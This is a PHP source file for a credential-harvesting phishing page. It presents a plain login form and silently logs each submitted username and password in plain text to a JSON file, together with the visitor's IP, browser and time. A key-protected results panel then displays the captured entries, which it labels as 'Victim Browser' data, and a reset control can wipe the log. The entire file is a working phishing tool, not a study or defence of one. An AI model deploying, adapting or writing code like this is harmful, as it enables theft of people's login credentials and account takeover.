<?php
session_start();
date_default_timezone_set('Asia/Jakarta');
function getIP() {
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP']))
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_X_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    else if(isset($_SERVER['HTTP_X_CLUSTER_CLIENT_IP']))
        $ipaddress = $_SERVER['HTTP_X_CLUSTER_CLIENT_IP'];
    else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    else if(isset($_SERVER['REMOTE_ADDR']))
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    else
        $ipaddress = 'Unknown';
    return $ipaddress;
}
function getBrowser() {
    $u_agent 	= $_SERVER['HTTP_USER_AGENT'];
    $bname 		= 'Unknown';
    $platform 	= 'Unknown';
    $version 	= "";

    if (preg_match('/linux/i', $u_agent)) {
        $platform = 'linux';
    }
    elseif (preg_match('/macintosh|mac os x/i', $u_agent)) {
        $platform = 'mac';
    }
    elseif (preg_match('/windows|win32/i', $u_agent)) {
        $platform = 'Windows';
    }
   
    if(preg_match('/MSIE/i',$u_agent) && !preg_match('/Opera/i',$u_agent)) {
        $bname 	= 'Internet Explorer';
        $ub 	= "MSIE";
    }
    elseif(preg_match('/Firefox/i',$u_agent)) {
        $bname 	= 'Mozilla Firefox';
        $ub 	= "Firefox";
    }
    elseif(preg_match('/Chrome/i',$u_agent)) {
        $bname 	= 'Google Chrome';
        $ub 	= "Chrome";
    }
    elseif(preg_match('/Safari/i',$u_agent)) {
        $bname 	= 'Apple Safari';
        $ub 	= "Safari";
    }
    elseif(preg_match('/Opera/i',$u_agent)) {
        $bname 	= 'Opera';
        $ub 	= "Opera";
    }
    elseif(preg_match('/Netscape/i',$u_agent)) {
        $bname 	= 'Netscape';
        $ub 	= "Netscape";
    }
   
    $known		= array('Version', $ub, 'other');
    $pattern 	= '#(?<browser>' . join('|', $known) .
    ')[/ ]+(?<version>[0-9.|a-zA-Z.]*)#';
    if (!preg_match_all($pattern, $u_agent, $matches)) {}
   
    $i = count($matches['browser']);
    if ($i != 1) {
        if (strripos($u_agent,"Version") < strripos($u_agent,$ub)){
            $version = $matches['version'][0];
        }
        else {
            $version = $matches['version'][1];
        }
    }
    else {
        $version = $matches['version'][0];
    }
   
    if ($version == null || $version == "") {
    	$version = "?";
    }
   
    return array(
        'userAgent' => $u_agent,
        'name'      => $bname,
        'version'   => $version,
        'platform'  => $platform,
        'pattern'   => $pattern
    );
}
function info($name) {
	if ($name === 'ip') {
		return getIP();
	} elseif ($name === 'browser') {
		$browser = getBrowser();

		return $browser['name']." ".$browser['version']." on ".$browser['platform'];
	}
}

if (isset($_POST['login'])) {
	$data = @file_get_contents("65d592ca6de0975858e73068ddb745bea5b095e0.json");
	$json_arr = json_decode($data, true);
	$json_arr[] = array(
		'user' 		=> $_POST['user'], 
		'pass' 		=> $_POST['pass'], 
		'date' 		=> $_POST['date'],
		'ip'		=> $_POST['ip'],
		'browser' 	=> $_POST['browser']

	);
	file_put_contents('65d592ca6de0975858e73068ddb745bea5b095e0.json', json_encode($json_arr));
}
if (isset($_POST['reset'])) {
	file_put_contents("65d592ca6de0975858e73068ddb745bea5b095e0.json", "");
}
?>
<style type="text/css">
	@import url('https://fonts.googleapis.com/css2?family=Andika+New+Basic&display=swap');
	.basic {
		font-family: 'Andika New Basic', sans-serif;
		position: absolute;
		padding:20px;
		background: #fff;
		border-radius:20px;
		border:1.5px solid rgba(0,0,0,0.12);
	}
	.label {
		min-width:130px;
		display: inline-block;
		padding-top:5px;
		padding-bottom:5px;
	}
	.p {
		width:15px;
		display: inline-block;
		padding-top:5px;
		padding-bottom:5px;
	}
	.user, .pass, .date, .ip, .browser{
		display: inline-block;
		padding-top:5px;
		padding-bottom:5px;
	}
	.bungkus {
		border:1.5px solid rgba(0,0,0,0.12);
		border-radius:10px;
		margin-bottom:7px;
		padding:15px;
	}
	.result {
		padding-bottom:10px;
		font-size:25px;
	}
	.result button {
		float: right;
	}
</style>
<form method="post">
	<input type="text" name="user" placeholder="Username">
	<input type="text" name="pass" placeholder="Password">
	<input type="hidden" name="date" value="<?= date("d/m/Y - H:i") ?>">
	<input type="hidden" name="ip" value="<?= info('ip') ?>">
	<input type="hidden" name="browser" value="<?= info('browser') ?>">
	<button name="login">Login</button>
</form>
<?php
$data = file_get_contents("65d592ca6de0975858e73068ddb745bea5b095e0.json");
$key = "rabbitx"; //sha1(65d592ca6de0975858e73068ddb745bea5b095e0)
if (empty($key) || (isset($_GET['key']) && ($_GET['key'] == sha1($key)))) {
	?>
	<div class="basic">
		<form method="post">
			<div class="result">
				Result
				<button name="reset" disabled="">reset</button>
			</div>
		</form>
		<?php
		foreach(json_decode($data, true) as $key => $value): ?>
			<div class="bungkus">
				<div class="label">
					Username
				</div>
				<div class="p">:</div>
				<div class="user">
					<?= $value['user'] ?>
				</div>
				<br>

				<div class="label">
					Password
				</div>
				<div class="p">:</div>
				<div class="pass">
					<?= $value['pass'] ?>
				</div>
				<br>

				<div class="label">
					Date
				</div>
				<div class="p">:</div>
				<div class="date">
					<?= $value['date'] ?>
				</div>
				<br>

				<div class="label">
					IP
				</div>
				<div class="p">:</div>
				<div class="ip">
					<?= $value['ip'] ?>
				</div>
				<br>

				<div class="label">
					Victim Browser
				</div>
				<div class="p">:</div>
				<div class="browser">
					<?= $value['browser'] ?>
				</div>
			</div>
		<?php endforeach; ?>
	</div>
	<?php
}
?>
</body>
</html>
